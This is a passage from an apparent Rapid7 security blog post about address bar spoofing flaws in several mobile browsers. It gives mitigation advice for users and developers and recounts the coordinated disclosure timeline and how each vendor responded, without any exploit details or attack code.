By the way, if this all sounds familiar, an early reference for this class of vulnerability is from back in 2016, when Mozilla disclosed [MFSA-2016-82](https://www.mozilla.org/en-US/security/advisories/mfsa2016-82/), reported by—you guessed it!—a young Rafay Baloch. It will sound familiar again in just a few more weeks, since this research netted out some similar bugs in some desktop browsers as well. Those will be disclosed in a later writeup, though it should be mentioned that MacOS Safari was also affected by the same issue (and fixed in the Big Sur MacOS release from a couple days ago).

## Mitigation

First off, pay attention to the browsers listed in the table above and who’s actually issued a fix and who remained silent. If your favorite browser is one of the former, congratulations, you probably don't have to do anything—most people let their browser auto-update, so you should be good as of this writing if you're one of those people.

For users of the rest of the browsers listed, you might want to leave a review on the appropriate app store asking when a patch will be available, and reference either this blog post or [Rafay's paper](http://www.rafaybaloch.com/2020/10/multiple-address-bar-spoofing-vulnerabilities.html). In the event you're stuck without a patch and you feel you must continue to use that browser, I would suggest that you think long and hard about clicking through on links sent to you by text or email from unknown or shady sources.

This "thinking hard" is about the only protection you really have, since on most texting and email interfaces, long press on a link might get you a preview, or it might copy it to the clipboard, or it might do something else. There's very little consistency there, and nothing on mobile is quite equivalent to the desktop practice of "mouse over the link and see the target URL." The good news is that these aren't code execution bugs or anything like that, but any malicious uses of these vulnerabilities will be designed to trick you into doing something, so be careful out there.

For developers of mobile applications, and especially general-purpose browsers: You always need to be extra, extra careful about the parts of the interface that you are using to assert security-sensitive things to users, and you should do your best to train users to trust those areas over other, user-controlled elements. Android and iOS do a pretty good job of making sure applications can't go completely wild on the user with sandboxing and controls around other operating system level UI, so the in-application UI is where all the malicious action is at. Also, if you're looking for a code review of your mobile app, [I know a guy](https://www.rapid7.com/services/security-consulting/iot-security-services/).

## Disclosure details

Rafay Baloch first discovered and documented these vulnerabilities over the summer of 2020, and we coordinated with Rafay to send out a flurry of vulnerability notifications on Monday, Aug. 10, 2020. As indicated in the table of Affected Browsers up top, we experienced a range of responses to these disclosures. Both Opera and Apple were Johnny-on-the-spot when it came to handling and addressing these vulnerabilities, assigning tickets and incident IDs to these issues (Ticket number OT-2310 from the Opera team, incident number 742977112 from Apple). This isn't surprising, since both Opera and Apple are well-practiced in coordinated vulnerability disclosure (CVD), and are, in fact, [CVE numbering authorities](https://cve.mitre.org/cve/cna.html) themselves.

One vendor didn't reply at all, two replied just before publication of this disclosure, and one disclosure notification bounced completely when trying to disclose to the support email listed on the app's iTunes page (for that one, we alerted Apple product security that it might be abandonware). As of this writing, we don't know whether an update is planned for those other vendors' products. If there is a fix, we'll update this blog post accordingly. (*Update October 22: UC Browser, Opera Touch, Yandex, and Safari have all shipped fixes as of today. This parenthetical will change in the future with any other response updates. Opera Mini shipped a fixed version on November 23, 2020.)*

I'm reminded of the quip from my friend [Rob Graham](https://twitter.com/ErrataRob) at ErrataSec: Disclosing vulnerabilities to  vendors who haven't set up a way to handle incoming vulnerabilities can feel a lot like writing "WASH ME" on a dirty car on the street (paraphrasing here). It might technically tick a "helpful advice" box, but really nobody is going to act on it, and usually, it reads kind of annoying and churlish. That said, it doesn't mean we shouldn't at least try to take a run at CVD, even if it feels kind of pointless in the moment.

In this case, I'm at least happy that nobody got all bent out of shape and sent a lawyer after me or Rafay, and in other cases, we've seen that first contact is exactly the sort of thing that can nudge a vendor over the line between "no vuln handling" to "some vuln handling," so they're in a better position for next time. This is all to say, we hope this disclosure is exactly that nudge that these other mobile browser providers need to get with the CVD program. And hey, browser vendors, if you need any help with setting that up, [I know another gal](https://www.lutasecurity.com/) who's pretty good at that sort of thing. If you're providing software to tens of thousands to millions of people, having this CVD capability is pretty crucial for their safety and your continued success, so let's get on that!

As always, if you have thoughts on this, feel free to leave a comment below, shoot me a [tweet](https://twitter.com/todb), or email us at research@rapid7.com. If you want help on disclosing a vulnerability, you're welcome to to email me at cve@rapid7.com, and we can help you with that too. I've known Rafay for years now, all thanks to CVD, and this sort of thing is one of the most fun and rewarding parts of my job, so don't be shy!

#### NEVER MISS A BLOG

Get the latest stories, expertise, and news about security today.

Subscribe

#### POST TAGS

* [Vulnerability Disclosure](/blog/tag/vulnerability-disclosure/ "Vulnerability Disclosure")
* [Android](/blog/tag/android/ "Android")
* [Apple](/blog/tag/apple/ "Apple")
* [Vulnerability Management](/blog/tag/vulnerability-management/ "Vulnerability Management")

#### SHARING IS CARING

#### AUTHOR

[Tod Beardsley](/blog/author/tod-beardsley/ "Tod Beardsley")

Director of Research at Rapid7, contributing author of several Rapid7 research papers, CVE Board member, and Metasploit collaborator. https://infosec.exchange/@todb

[View Tod's Posts](/blog/author/tod-beardsley/)

![](https://blog.rapid7.com/content/images/2020/10/October.jpg)

## Topics

* [Metasploit
   *(664)*](/blog/tag/metasploit/)
* [Vulnerability Management
   *(368)*](/blog/tag/vulnerability-management/)
* [Research
   *(244)*](/blog/tag/research/)
* [Detection and Response
   *(208)*](/blog/tag/detection-and-response/)
* [Vulnerability Disclosure
   *(150)*](/blog/tag/vulnerability-disclosure/)
* [Emergent Threat Response
   *(146)*](/blog/tag/emergent-threat-response/)
* [Cloud Security
   *(137)*](/blog/tag/cloud-security/)
* [Security Operations
   *(21)*](/blog/tag/secops/)

## Popular Tags

* [Metasploit](/blog/tag/metasploit/)
* [Metasploit Weekly Wrapup](/blog/tag/metasploit-weekly-wrapup/)
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [Research](/blog/tag/research/)
* [Detection and Response](/blog/tag/detection-and-response/)
* [Logentries](/blog/tag/logentries/)

## Related Posts

Fortinet Firewalls Hit with New Zero-Day Attack, Older Data Leak

[Read More](/blog/post/2025/01/16/etr-fortinet-firewalls-hit-with-new-zero-day-attack-older-data-leak/)

Patch Tuesday - January 2025

[Read More](/blog/post/2025/01/14/patch-tuesday-january-2025/)

CVE-2025-0282: Ivanti Connect Secure Zero-Day Exploited in the Wild

[Read More](/blog/post/2025/01/08/etr-cve-2025-0282-ivanti-connect-secure-zero-day-exploited-in-the-wild/)

2024 Threat Landscape Statistics: Ransomware Activity, Vulnerability Exploits, and Attack Trends

[Read More](/blog/post/2024/12/16/2024-threat-landscape-statistics-ransomware-activity-vulnerability-exploits-and-attack-trends/)

## Related Posts

[Emergent Threat Response

Fortinet Firewalls Hit with New Zero-Day Attack, Older Data Leak

Read Full Post](/blog/post/2025/01/16/etr-fortinet-firewalls-hit-with-new-zero-day-attack-older-data-leak/)

[Patch Tuesday

Patch Tuesday - January 2025

Read Full Post](/blog/post/2025/01/14/patch-tuesday-january-2025/)

[Emergent Threat Response

CVE-2025-0282: Ivanti Connect Secure Zero-Day Exploited in the Wild

Read Full Post](/blog/post/2025/01/08/etr-cve-2025-0282-ivanti-connect-secure-zero-day-exploited-in-the-wild/)

[Labs

2024 Threat Landscape Statistics: Ransomware Activity, Vulnerability Exploits, and Attack Trends

Read Full Post](/blog/post/2024/12/16/2024-threat-landscape-statistics-ransomware-activity-vulnerability-exploits-and-attack-trends/)

[View All Posts](/blog/posts/)

Search

[BACK TO TOP
![](/includes/img/up-arrow-lightgray.png?width=1200)](#__)

[![Rapid7 logo](/includes/img/Rapid7_logo.svg?width=1200&quality=90)](/)
CUSTOMER SUPPORT
+1-866-390-8113 (Toll Free)
SALES SUPPORT
+1-866-772-7437 (Toll Free)
Need to report an Escalation or a Breach?
[Get Help](/services/incident-response-customer-escalation/)

SOLUTIONS
[The Command Platform](/platform/)
[Exposure Command](/products/command/exposure-management/)
[Managed Threat Complete](/services/managed-detection-and-response-mdr/)

SUPPORT & RESOURCES
[Product Support](https://www.rapid7.com/for-customers/)
[Resource Library](https://www.rapid7.com/resources/)
[Our Customers](https://www.rapid7.com/customers/)
[Events & Webcasts](https://www.rapid7.com/about/events-webcasts/)
[Training & Certification](https://www.rapid7.com/services/training-certification/)
[Cybersecurity Fundamentals](https://www.rapid7.com/fundamentals/)
[Vulnerability & Exploit Database](https://www.rapid7.com/db/)

ABOUT US
[Company](https://www.rapid7.com/about/company/)
[Diversity, Equity, and Inclusion](https://www.rapid7.com/about/diversity-equity-and-inclusion/)
[Leadership](https://www.rapid7.com/about/leadership/)
[News & Press Releases](https://www.rapid7.com/about/news/)
[Public Policy](https://www.rapid7.com/about/public-policy/)
[Open Source](https://www.rapid7.com/open-source/)
[Investors](https://investors.rapid7.com/overview/default.aspx)

CONNECT WITH US
[Contact](https://www.rapid7.com/contact/)
[Blog](https://www.rapid7.com/blog/)
[Support Login](https://insight.rapid7.com/login)
[Careers](https://careers.rapid7.com/careers-home)

© Rapid7
[Legal Terms](/legal/)
  |   [Privacy Policy](/privacy-policy/)
  |   [Export Notice](/export-notice/)
  |   [Trust](/trust/)
  |   Do Not Sell or Share My Personal Information
  |   Cookie Preferences

Contact Us

## Submit your information and we will get in touch with you.

#### Thank you for contacting us.

##### We will be in touch shortly.

![Rapid7 logo](/includes/img/logo-black.png)

### General:

info@rapid7.com

### Sales:

+1-866-772-7437
sales@rapid7.com

### Support:

+1–866–390–8113 (toll free)
support@rapid7.com

### Incident Response:

1-844-727-4347

[More Contact Info](/contact/)

## Never miss a blog

Get the latest stories, expertise, and news about security today.

You’re almost done!
 Check your email to confirm your subscription.


